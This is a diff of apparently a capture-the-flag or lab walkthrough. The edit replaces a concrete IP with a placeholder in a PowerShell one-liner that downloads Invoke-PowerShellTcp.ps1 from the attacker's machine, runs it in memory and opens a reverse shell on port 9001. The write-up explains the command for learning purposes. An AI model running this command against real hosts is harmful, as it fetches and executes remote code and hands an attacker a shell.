@@ -35,7 +35,7 @@ powershell iex (New-Object Net.WebClient).DownloadString('http://your-ip:your-po
 In my case i used the below command, where i change the ip and port to match my machine.
 
 ```
-powershell iex (New-Object Net.WebClient).DownloadString('http://10.11.23.202:8000/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.11.23.202 -Port 9001
+powershell iex (New-Object Net.WebClient).DownloadString('http://My_IP:8000/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress My_IP -Port 9001
 ```
 
 To breakdown this command we can tell that the first part of the command will download a file from a specific website or server, in this case from my kali machine and the 
